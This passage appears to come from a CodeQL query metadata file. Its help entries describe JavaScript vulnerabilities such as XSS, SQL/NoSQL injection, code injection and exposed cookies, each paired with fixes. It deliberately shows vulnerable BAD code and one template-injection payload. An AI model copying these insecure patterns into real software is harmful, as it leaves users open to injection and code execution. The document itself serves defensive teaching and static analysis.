    This kind of vulnerability is also called *reflected* cross-site scripting, to distinguish it from other types of cross-site scripting.


    ## Recommendation
    To guard against cross-site scripting, consider using contextual output encoding/escaping before writing user input to the response, or one of the other solutions that are mentioned in the references.


    ## Example
    The following example code writes part of an HTTP request (which is controlled by the user) directly to the response. This leaves the website vulnerable to cross-site scripting.


    ```javascript
    var app = require('express')();

    app.get('/user/:id', function(req, res) {
      if (!isValidUserId(req.params.id))
        // BAD: a request parameter is incorporated without validation into the response
        res.send("Unknown user: " + req.params.id);
      else
        // TODO: do something exciting
        ;
    });

    ```
    Sanitizing the user-controlled data prevents the vulnerability:


    ```javascript
    var escape = require('escape-html');

    var app = require('express')();

    app.get('/user/:id', function(req, res) {
      if (!isValidUserId(req.params.id))
        // GOOD: request parameter is sanitized before incorporating it into the response
        res.send("Unknown user: " + escape(req.params.id));
      else
        // TODO: do something exciting
        ;
    });

    ```

    ## References
    * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
    * OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).
    * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-079/StoredXss.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-079/StoredXss.bqrs
  metadata:
    name: Stored cross-site scripting
    description: |-
      Using uncontrolled stored values in HTML allows for
                    a stored cross-site scripting vulnerability.
    kind: path-problem
    problem.severity: error
    security-severity: 7.8
    precision: high
    id: js/stored-xss
    tags: |-
      security
             external/cwe/cwe-079
             external/cwe/cwe-116
  queryHelp: |
    # Stored cross-site scripting
    Directly using uncontrolled stored value (for example, file names) to create HTML content without properly sanitizing the input first, allows for a cross-site scripting vulnerability.

    This kind of vulnerability is also called *stored* cross-site scripting, to distinguish it from other types of cross-site scripting.


    ## Recommendation
    To guard against cross-site scripting, consider using contextual output encoding/escaping before using uncontrolled stored values to create HTML content, or one of the other solutions that are mentioned in the references.


    ## Example
    The following example code writes file names directly to a HTTP response. This leaves the website vulnerable to cross-site scripting, if an attacker can choose the file names on the disk.


    ```javascript
    var express = require('express'),
        fs = require('fs');

    express().get('/list-directory', function(req, res) {
        fs.readdir('/public', function (error, fileNames) {
            var list = '<ul>';
            fileNames.forEach(fileName => {
                // BAD: `fileName` can contain HTML elements
                list += '<li>' + fileName + '</li>';
            });
            list += '</ul>'
            res.send(list);
        });
    });

    ```
    Sanitizing the file names prevents the vulnerability:


    ```javascript
    var express = require('express'),
        fs = require('fs'),
        escape = require('escape-html');

    express().get('/list-directory', function(req, res) {
        fs.readdir('/public', function (error, fileNames) {
            var list = '<ul>';
            fileNames.forEach(fileName => {
                // GOOD: escaped `fileName` can not contain HTML elements
                list += '<li>' + escape(fileName) + '</li>';
            });
            list += '</ul>'
            res.send(list);
        });
    });

    ```

    ## References
    * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
    * OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).
    * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-079/UnsafeHtmlConstruction.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-079/UnsafeHtmlConstruction.bqrs
  metadata:
    name: Unsafe HTML constructed from library input
    description: |-
      Using externally controlled strings to construct HTML might allow a malicious
                    user to perform a cross-site scripting attack.
    kind: path-problem
    problem.severity: error
    security-severity: 6.1
    precision: high
    id: js/html-constructed-from-input
    tags: |-
      security
             external/cwe/cwe-079
             external/cwe/cwe-116
  queryHelp: |
    # Unsafe HTML constructed from library input
    When a library function dynamically constructs HTML in a potentially unsafe way, then it's important to document to clients of the library that the function should only be used with trusted inputs. If the function is not documented as being potentially unsafe, then a client may inadvertently use inputs containing unsafe HTML fragments, and thereby leave the client vulnerable to cross-site scripting attacks.


    ## Recommendation
    Document all library functions that can lead to cross-site scripting attacks, and guard against unsafe inputs where dynamic HTML construction is not intended.


    ## Example
    The following example has a library function that renders a boldface name by writing to the `innerHTML` property of an element.


    ```javascript
    module.exports = function showBoldName(name) {
      document.getElementById('name').innerHTML = "<b>" + name + "</b>";
    }

    ```
    This library function, however, does not escape unsafe HTML, and a client that calls the function with user-supplied input may be vulnerable to cross-site scripting attacks.

    The library could either document that this function should not be used with unsafe inputs, or use safe APIs such as `innerText`.


    ```javascript
    module.exports = function showBoldName(name) {
      const bold = document.createElement('b');
      bold.innerText = name;
      document.getElementById('name').appendChild(bold);
    }

    ```
    Alternatively, an HTML sanitizer can be used to remove unsafe content.


    ```javascript

    const striptags = require('striptags');
    module.exports = function showBoldName(name) {
      document.getElementById('name').innerHTML = "<b>" + striptags(name) + "</b>";
    }

    ```

    ## References
    * OWASP: [DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet).
    * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_%28Cross_Site_Scripting%29_Prevention_Cheat_Sheet).
    * OWASP [DOM Based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).
    * OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).
    * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-079/UnsafeJQueryPlugin.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-079/UnsafeJQueryPlugin.bqrs
  metadata:
    name: Unsafe jQuery plugin
    description: A jQuery plugin that unintentionally constructs HTML from some of
      its options may be unsafe to use for clients.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.1
    precision: high
    id: js/unsafe-jquery-plugin
    tags: |-
      security
             external/cwe/cwe-079
             external/cwe/cwe-116
             frameworks/jquery
  queryHelp: "# Unsafe jQuery plugin\nLibrary plugins, such as those for the jQuery\
    \ library, are often configurable through options provided by the clients of the\
    \ plugin. Clients, however, do not know the implementation details of the plugin,\
    \ so it is important to document the capabilities of each option. The documentation\
    \ for the plugin options that the client is responsible for sanitizing is of particular\
    \ importance. Otherwise, the plugin may write user input (for example, a URL query\
    \ parameter) to a web page without properly sanitizing it first, which allows\
    \ for a cross-site scripting vulnerability in the client application through dynamic\
    \ HTML construction.\n\n\n## Recommendation\nDocument all options that can lead\
    \ to cross-site scripting attacks, and guard against unsafe inputs where dynamic\
    \ HTML construction is not intended.\n\n\n## Example\nThe following example shows\
    \ a jQuery plugin that selects a DOM element, and copies its text content to another\
    \ DOM element. The selection is performed by using the plugin option `sourceSelector`\
    \ as a CSS selector.\n\n\n```javascript\njQuery.fn.copyText = function(options)\
    \ {\n\t// BAD may evaluate `options.sourceSelector` as HTML\n\tvar source = jQuery(options.sourceSelector),\n\
    \t    text = source.text();\n\tjQuery(this).text(text);\n}\n\n```\nThis is, however,\
    \ not a safe plugin, since the call to `jQuery` interprets `sourceSelector` as\
    \ HTML if it is a string that starts with `<`.\n\nInstead of documenting that\
    \ the client is responsible for sanitizing `sourceSelector`, the plugin can use\
    \ `jQuery.find` to always interpret `sourceSelector` as a CSS selector:\n\n\n\
    ```javascript\njQuery.fn.copyText = function(options) {\n\t// GOOD may not evaluate\
    \ `options.sourceSelector` as HTML\n\tvar source = jQuery.find(options.sourceSelector),\n\
    \t    text = source.text();\n\tjQuery(this).text(text);\n}\n\n```\n\n## References\n\
    * OWASP: [DOM based XSS Prevention Cheat Sheet](https://www.owasp.org/index.php/DOM_based_XSS_Prevention_Cheat_Sheet).\n\
    * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n\
    * OWASP [DOM Based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).\n* OWASP\
    \ [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).\n\
    * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n\
    * jQuery: [Plugin creation](https://learn.jquery.com/plugins/basic-plugin-creation/).\n\
    * Bootstrap: [XSS vulnerable bootstrap plugins](https://github.com/twbs/bootstrap/pull/27047).\n\
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n\
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-079/Xss.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-079/Xss.bqrs
  metadata:
    name: Client-side cross-site scripting
    description: |-
      Writing user input directly to the DOM allows for
                    a cross-site scripting vulnerability.
    kind: path-problem
    problem.severity: error
    security-severity: 7.8
    precision: high
    id: js/xss
    tags: |-
      security
             external/cwe/cwe-079
             external/cwe/cwe-116
  queryHelp: |
    # Client-side cross-site scripting
    Directly writing user input (for example, a URL query parameter) to a webpage without properly sanitizing the input first, allows for a cross-site scripting vulnerability.

    This kind of vulnerability is also called *DOM-based* cross-site scripting, to distinguish it from other types of cross-site scripting.


    ## Recommendation
    To guard against cross-site scripting, consider using contextual output encoding/escaping before writing user input to the page, or one of the other solutions that are mentioned in the references.


    ## Example
    The following example shows part of the page URL being written directly to the document, leaving the website vulnerable to cross-site scripting.


    ```javascript
    function setLanguageOptions() {
        var href = document.location.href,
            deflt = href.substring(href.indexOf("default=")+8);
        document.write("<OPTION value=1>"+deflt+"</OPTION>");
        document.write("<OPTION value=2>English</OPTION>");
    }

    ```

    ## References
    * OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).
    * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).
    * OWASP [DOM Based XSS](https://www.owasp.org/index.php/DOM_Based_XSS).
    * OWASP [Types of Cross-Site Scripting](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting).
    * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-079/XssThroughDom.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-079/XssThroughDom.bqrs
  metadata:
    name: DOM text reinterpreted as HTML
    description: |-
      Reinterpreting text from the DOM as HTML
                    can lead to a cross-site scripting vulnerability.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.1
    precision: high
    id: js/xss-through-dom
    tags: |-
      security
             external/cwe/cwe-079
             external/cwe/cwe-116
  queryHelp: "# DOM text reinterpreted as HTML\nExtracting text from a DOM node and\
    \ interpreting it as HTML can lead to a cross-site scripting vulnerability.\n\n\
    A webpage with this vulnerability reads text from the DOM, and afterwards adds\
    \ the text as HTML to the DOM. Using text from the DOM as HTML effectively unescapes\
    \ the text, and thereby invalidates any escaping done on the text. If an attacker\
    \ is able to control the safe sanitized text, then this vulnerability can be exploited\
    \ to perform a cross-site scripting attack.\n\n\n## Recommendation\nTo guard against\
    \ cross-site scripting, consider using contextual output encoding/escaping before\
    \ writing text to the page, or one of the other solutions that are mentioned in\
    \ the References section below.\n\n\n## Example\nThe following example shows a\
    \ webpage using a `data-target` attribute to select and manipulate a DOM element\
    \ using the JQuery library. In the example, the `data-target` attribute is read\
    \ into the `target` variable, and the `$` function is then supposed to use the\
    \ `target` variable as a CSS selector to determine which element should be manipulated.\n\
    \n\n```javascript\n$(\"button\").click(function () {\n    var target = $(this).attr(\"\
    data-target\");\n    $(target).hide();\n});\n\n```\nHowever, if an attacker can\
    \ control the `data-target` attribute, then the value of `target` can be used\
    \ to cause the `$` function to execute arbitrary JavaScript.\n\nThe above vulnerability\
    \ can be fixed by using `$.find` instead of `$`. The `$.find` function will only\
    \ interpret `target` as a CSS selector and never as HTML, thereby preventing an\
    \ XSS attack.\n\n\n```javascript\n$(\"button\").click(function () {\n    var target\
    \ = $(this).attr(\"data-target\");\n\t$.find(target).hide();\n});\n\n```\n\n##\
    \ References\n* OWASP: [DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html).\n\
    * OWASP: [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html).\n\
    * OWASP [DOM Based XSS](https://owasp.org/www-community/attacks/DOM_Based_XSS).\n\
    * OWASP [Types of Cross-Site Scripting](https://owasp.org/www-community/Types_of_Cross-Site_Scripting).\n\
    * Wikipedia: [Cross-site scripting](http://en.wikipedia.org/wiki/Cross-site_scripting).\n\
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).\n\
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-089/SqlInjection.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-089/SqlInjection.bqrs
  metadata:
    name: Database query built from user-controlled sources
    description: |-
      Building a database query from user-controlled sources is vulnerable to insertion of
                    malicious code by the user.
    kind: path-problem
    problem.severity: error
    security-severity: 8.8
    precision: high
    id: js/sql-injection
    tags: |-
      security
             external/cwe/cwe-089
             external/cwe/cwe-090
             external/cwe/cwe-943
  queryHelp: |
    # Database query built from user-controlled sources
    If a database query (such as a SQL or NoSQL query) is built from user-provided data without sufficient sanitization, a malicious user may be able to run malicious database queries.


    ## Recommendation
    Most database connector libraries offer a way of safely embedding untrusted data into a query by means of query parameters or prepared statements.

    For NoSQL queries, make use of an operator like MongoDB's `$eq` to ensure that untrusted data is interpreted as a literal value and not as a query object. Alternatively, check that the untrusted data is a literal value and not a query object before using it in a query.

    For SQL queries, use query parameters or prepared statements to embed untrusted data into the query string, or use a library like `sqlstring` to escape untrusted data.


    ## Example
    In the following example, assume the function `handler` is an HTTP request handler in a web application, whose parameter `req` contains the request object.

    The handler constructs an SQL query string from user input and executes it as a database query using the `pg` library. The user input may contain quote characters, so this code is vulnerable to a SQL injection attack.


    ```javascript
    const app = require("express")(),
          pg = require("pg"),
          pool = new pg.Pool(config);

    app.get("search", function handler(req, res) {
      // BAD: the category might have SQL special characters in it
      var query1 =
        "SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='" +
        req.params.category +
        "' ORDER BY PRICE";
      pool.query(query1, [], function(err, results) {
        // process results
      });
    });

    ```
    To fix this vulnerability, we can use query parameters to embed the user input into the query string. In this example, we use the API offered by the `pg` Postgres database connector library, but other libraries offer similar features. This version is immune to injection attacks.


    ```javascript
    const app = require("express")(),
          pg = require("pg"),
          pool = new pg.Pool(config);

    app.get("search", function handler(req, res) {
      // GOOD: use parameters
      var query2 =
        "SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY=$1 ORDER BY PRICE";
      pool.query(query2, [req.params.category], function(err, results) {
        // process results
      });
    });

    ```
    Alternatively, we can use a library like `sqlstring` to escape the user input before embedding it into the query string:


    ```javascript
    const app = require("express")(),
          pg = require("pg"),
          SqlString = require('sqlstring'),
          pool = new pg.Pool(config);

    app.get("search", function handler(req, res) {
      // GOOD: the category is escaped using mysql.escape
      var query1 =
        "SELECT ITEM,PRICE FROM PRODUCT WHERE ITEM_CATEGORY='" +
        SqlString.escape(req.params.category) +
        "' ORDER BY PRICE";
      pool.query(query1, [], function(err, results) {
        // process results
      });
    });

    ```

    ## Example
    In the following example, an express handler attempts to delete a single document from a MongoDB collection. The document to be deleted is identified by its `_id` field, which is constructed from user input. The user input may contain a query object, so this code is vulnerable to a NoSQL injection attack.


    ```javascript
    const express = require("express");
    const mongoose = require("mongoose");
    const Todo = mongoose.model(
      "Todo",
      new mongoose.Schema({ text: { type: String } }, { timestamps: true })
    );

    const app = express();
    app.use(express.json());
    app.use(express.urlencoded({ extended: false }));

    app.delete("/api/delete", async (req, res) => {
      let id = req.body.id;

      await Todo.deleteOne({ _id: id }); // BAD: id might be an object with special properties

      res.json({ status: "ok" });
    });

    ```
    To fix this vulnerability, we can use the `$eq` operator to ensure that the user input is interpreted as a literal value and not as a query object:


    ```javascript
    app.delete("/api/delete", async (req, res) => {
      let id = req.body.id;
      await Todo.deleteOne({ _id: { $eq: id } }); // GOOD: using $eq operator for the comparison

      res.json({ status: "ok" });
    });
    ```
    Alternatively check that the user input is a literal value and not a query object before using it:


    ```javascript
    app.delete("/api/delete", async (req, res) => {
      let id = req.body.id;
      if (typeof id !== "string") {
        res.status(400).json({ status: "error" });
        return;
      }
      await Todo.deleteOne({ _id: id }); // GOOD: id is guaranteed to be a string

      res.json({ status: "ok" });
    });

    ```

    ## References
    * Wikipedia: [SQL injection](https://en.wikipedia.org/wiki/SQL_injection).
    * MongoDB: [$eq operator](https://docs.mongodb.com/manual/reference/operator/query/eq).
    * OWASP: [NoSQL injection](https://owasp.org/www-pdf-archive/GOD16-NOSQL.pdf).
    * Common Weakness Enumeration: [CWE-89](https://cwe.mitre.org/data/definitions/89.html).
    * Common Weakness Enumeration: [CWE-90](https://cwe.mitre.org/data/definitions/90.html).
    * Common Weakness Enumeration: [CWE-943](https://cwe.mitre.org/data/definitions/943.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-094/CodeInjection.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-094/CodeInjection.bqrs
  metadata:
    name: Code injection
    description: |-
      Interpreting unsanitized user input as code allows a malicious user arbitrary
                    code execution.
    kind: path-problem
    problem.severity: error
    security-severity: 9.3
    precision: high
    id: js/code-injection
    tags: |-
      security
             external/cwe/cwe-094
             external/cwe/cwe-095
             external/cwe/cwe-079
             external/cwe/cwe-116
  queryHelp: |
    # Code injection
    Directly evaluating user input (for example, an HTTP request parameter) as code without properly sanitizing the input first allows an attacker arbitrary code execution. This can occur when user input is treated as JavaScript, or passed to a framework which interprets it as an expression to be evaluated. Examples include AngularJS expressions or JQuery selectors.


    ## Recommendation
    Avoid including user input in any expression which may be dynamically evaluated. If user input must be included, use context-specific escaping before including it. It is important that the correct escaping is used for the type of evaluation that will occur.


    ## Example
    The following example shows part of the page URL being evaluated as JavaScript code. This allows an attacker to provide JavaScript within the URL. If an attacker can persuade a user to click on a link to such a URL, the attacker can evaluate arbitrary JavaScript in the browser of the user to, for example, steal cookies containing session information.


    ```javascript
    eval(document.location.href.substring(document.location.href.indexOf("default=")+8))

    ```
    The following example shows a Pug template being constructed from user input, allowing attackers to run arbitrary code via a payload such as `#{global.process.exit(1)}`.


    ```javascript
    const express = require('express')
    var pug = require('pug');
    const app = express()

    app.post('/', (req, res) => {
        var input = req.query.username;
        var template = `
    doctype
    html
    head
        title= 'Hello world'
    body
        form(action='/' method='post')
            input#name.form-control(type='text)
            button.btn.btn-primary(type='submit') Submit
        p Hello `+ input
        var fn = pug.compile(template);
        var html = fn();
        res.send(html);
    })

    ```
    Below is an example of how to use a template engine without any risk of template injection. The user input is included via an interpolation expression `#{username}` whose value is provided as an option to the template, instead of being part of the template string itself:


    ```javascript
    const express = require('express')
    var pug = require('pug');
    const app = express()

    app.post('/', (req, res) => {
        var input = req.query.username;
        var template = `
    doctype
    html
    head
        title= 'Hello world'
    body
        form(action='/' method='post')
            input#name.form-control(type='text)
            button.btn.btn-primary(type='submit') Submit
        p Hello #{username}`
        var fn = pug.compile(template);
        var html = fn({username: input});
        res.send(html);
    })

    ```

    ## References
    * OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).
    * Wikipedia: [Code Injection](https://en.wikipedia.org/wiki/Code_injection).
    * PortSwigger Research Blog: [Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection).
    * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
    * Common Weakness Enumeration: [CWE-95](https://cwe.mitre.org/data/definitions/95.html).
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-094/ImproperCodeSanitization.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-094/ImproperCodeSanitization.bqrs
  metadata:
    name: Improper code sanitization
    description: Escaping code as HTML does not provide protection against code injection.
    kind: path-problem
    problem.severity: error
    security-severity: 6.1
    precision: high
    id: js/bad-code-sanitization
    tags: |-
      security
             external/cwe/cwe-094
             external/cwe/cwe-079
             external/cwe/cwe-116
  queryHelp: |
    # Improper code sanitization
    Using string concatenation to construct JavaScript code can be error-prone, or in the worst case, enable code injection if an input is constructed by an attacker.


    ## Recommendation
    If using `JSON.stringify` or an HTML sanitizer to sanitize a string inserted into JavaScript code, then make sure to perform additional sanitization or remove potentially dangerous characters.


    ## Example
    The example below constructs a function that assigns the number 42 to the property `key` on an object `obj`. However, if `key` contains `</script>`, then the generated code will break out of a `</script>` if inserted into a `</script>` tag.


    ```javascript
    function createObjectWrite() {
        const assignment = `obj[${JSON.stringify(key)}]=42`;
        return `(function(){${assignment}})` // NOT OK
    }
    ```
    The issue has been fixed by escaping potentially dangerous characters, as shown below.


    ```javascript
    const charMap = {
        '<': '\\u003C',
        '>' : '\\u003E',
        '/': '\\u002F',
        '\\': '\\\\',
        '\b': '\\b',
        '\f': '\\f',
        '\n': '\\n',
        '\r': '\\r',
        '\t': '\\t',
        '\0': '\\0',
        '\u2028': '\\u2028',
        '\u2029': '\\u2029'
    };

    function escapeUnsafeChars(str) {
        return str.replace(/[<>\b\f\n\r\t\0\u2028\u2029]/g, x => charMap[x])
    }

    function createObjectWrite() {
        const assignment = `obj[${escapeUnsafeChars(JSON.stringify(key))}]=42`;
        return `(function(){${assignment}})` // OK
    }
    ```

    ## References
    * OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).
    * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-094/UnsafeCodeConstruction.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-094/UnsafeCodeConstruction.bqrs
  metadata:
    name: Unsafe code constructed from library input
    description: |-
      Using externally controlled strings to construct code may allow a malicious
                    user to execute arbitrary code.
    kind: path-problem
    problem.severity: warning
    security-severity: 6.1
    precision: medium
    id: js/unsafe-code-construction
    tags: |-
      security
             external/cwe/cwe-094
             external/cwe/cwe-079
             external/cwe/cwe-116
  queryHelp: |
    # Unsafe code constructed from library input
    When a library function dynamically constructs code in a potentially unsafe way, then it's important to document to clients of the library that the function should only be used with trusted inputs. If the function is not documented as being potentially unsafe, then a client may incorrectly use inputs containing unsafe code fragments, and thereby leave the client vulnerable to code-injection attacks.


    ## Recommendation
    Properly document library functions that construct code from unsanitized inputs, or avoid constructing code in the first place.


    ## Example
    The following example shows two methods implemented using \`eval\`: a simple deserialization routine and a getter method. If untrusted inputs are used with these methods, then an attacker might be able to execute arbitrary code on the system.


    ```javascript
    export function unsafeDeserialize(value) {
      return eval(`(${value})`);
    }

    export function unsafeGetter(obj, path) {
        return eval(`obj.${path}`);
    }

    ```
    To avoid this problem, either properly document that the function is potentially unsafe, or use an alternative solution such as \`JSON.parse\` or another library, like in the examples below, that does not allow arbitrary code to be executed.


    ```javascript
    export function safeDeserialize(value) {
      return JSON.parse(value);
    }

    const _ = require("lodash");
    export function safeGetter(object, path) {
      return _.get(object, path);
    }

    ```

    ## References
    * OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).
    * Wikipedia: [Code Injection](https://en.wikipedia.org/wiki/Code_injection).
    * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).
    * Common Weakness Enumeration: [CWE-79](https://cwe.mitre.org/data/definitions/79.html).
    * Common Weakness Enumeration: [CWE-116](https://cwe.mitre.org/data/definitions/116.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-094/UnsafeDynamicMethodAccess.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-094/UnsafeDynamicMethodAccess.bqrs
  metadata:
    name: Unsafe dynamic method access
    description: Invoking user-controlled methods on certain objects can lead to remote
      code execution.
    kind: path-problem
    problem.severity: error
    security-severity: 9.3
    precision: high
    id: js/unsafe-dynamic-method-access
    tags: |-
      security
             external/cwe/cwe-094
  queryHelp: "# Unsafe dynamic method access\nCalling a user-controlled method on\
    \ certain objects can lead to invocation of unsafe functions, such as `eval` or\
    \ the `Function` constructor. In particular, the global object contains the `eval`\
    \ function, and any function object contains the `Function` constructor in its\
    \ `constructor` property.\n\n\n## Recommendation\nAvoid invoking user-controlled\
    \ methods on the global object or on any function object. Whitelist the permitted\
    \ method names or change the type of object the methods are stored on.\n\n\n##\
    \ Example\nIn the following example, a message from the document's parent frame\
    \ can invoke the `play` or `pause` method. However, it can also invoke `eval`.\
    \ A malicious website could embed the page in an iframe and execute arbitrary\
    \ code by sending a message with the name `eval`.\n\n\n```javascript\n// API methods\n\
    function play(data) {\n  // ...\n}\nfunction pause(data) {\n  // ...\n}\n\nwindow.addEventListener(\"\
    message\", (ev) => {\n    let message = JSON.parse(ev.data);\n\n    // Let the\
    \ parent frame call the 'play' or 'pause' function \n    window[message.name](message.payload);\n\
    });\n\n```\nInstead of storing the API methods in the global scope, put them in\
    \ an API object or Map. It is also good practice to prevent invocation of inherited\
    \ methods like `toString` and `valueOf`.\n\n\n```javascript\n// API methods\n\
    let api = {\n  play: function(data) {\n    // ...\n  },\n  pause: function(data)\
    \ {\n    // ...\n  }\n};\n\nwindow.addEventListener(\"message\", (ev) => {\n \
    \   let message = JSON.parse(ev.data);\n\n    // Let the parent frame call the\
    \ 'play' or 'pause' function\n    if (!api.hasOwnProperty(message.name)) {\n \
    \     return;\n    }\n    api[message.name](message.payload);\n});\n\n```\n\n\
    ## References\n* OWASP: [Code Injection](https://www.owasp.org/index.php/Code_Injection).\n\
    * MDN: [Global functions](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects#Function_properties).\n\
    * MDN: [Function constructor](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Function).\n\
    * Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n"
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-1004/ClientExposedCookie.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-1004/ClientExposedCookie.bqrs
  metadata:
    name: Sensitive server cookie exposed to the client
    description: Sensitive cookies set by a server can be read by the client if the
      `httpOnly` flag is not set.
    kind: problem
    problem.severity: warning
    security-severity: 5.0
    precision: high
    id: js/client-exposed-cookie
    tags: |-
      security
             external/cwe/cwe-1004
  queryHelp: |
    # Sensitive server cookie exposed to the client
    Authentication cookies stored by a server can be accessed by a client if the `httpOnly` flag is not set.

    An attacker that manages a cross-site scripting (XSS) attack can read the cookie and hijack the session.


    ## Recommendation
    Set the `httpOnly` flag on all cookies that are not needed by the client.


    ## Example
    The following example stores an authentication token in a cookie that can be viewed by the client.


    ```javascript
    const http = require('http');

    const server = http.createServer((req, res) => {
        res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}`);
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end('<h2>Hello world</h2>');
    });
    ```
    To force the cookie to be transmitted using SSL, set the `secure` attribute on the cookie.


    ```javascript
    const http = require('http');

    const server = http.createServer((req, res) => {
        res.setHeader("Set-Cookie", `authKey=${makeAuthkey()}; secure; httpOnly`);
        res.writeHead(200, { 'Content-Type': 'text/html' });
        res.end('<h2>Hello world</h2>');
    });
    ```

    ## References
    * ExpressJS: [Use cookies securely](https://expressjs.com/en/advanced/best-practice-security.html#use-cookies-securely).
    * OWASP: [Set cookie flags appropriately](https://cheatsheetseries.owasp.org/cheatsheets/Nodejs_Security_Cheat_Sheet.html#set-cookie-flags-appropriately).
    * Mozilla: [Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie).
    * Common Weakness Enumeration: [CWE-1004](https://cwe.mitre.org/data/definitions/1004.html).
 -
  pack: codeql/javascript-queries#0
  relativeQueryPath: Security/CWE-116/BadTagFilter.ql
  relativeBqrsPath: codeql/javascript-queries/Security/CWE-116/BadTagFilter.bqrs
  metadata:
    name: Bad HTML filtering regexp
